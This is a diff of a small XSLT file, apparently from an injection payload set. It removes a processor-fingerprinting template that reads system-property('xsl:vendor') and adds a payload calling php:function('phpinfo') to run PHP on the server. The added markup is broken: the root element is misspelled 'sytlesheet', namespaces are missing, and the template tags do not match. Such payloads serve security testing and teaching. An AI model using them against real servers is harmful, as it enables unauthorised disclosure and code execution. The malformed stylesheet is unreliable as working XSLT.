@@ -1,6 +1,6 @@
-
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-  <xsl:template match="/fruits">
-	<xsl:value-of select="system-property('xsl:vendor')"/>
-  </xsl:template>
+<xsl:sytlesheet version="1.0">
+<xsl:output method="html" />
+<xsl:template match="/" />
+<xsl:value-of select="php:function('phpinfo')" />
+</xsl:template>
 </xsl:stylesheet>
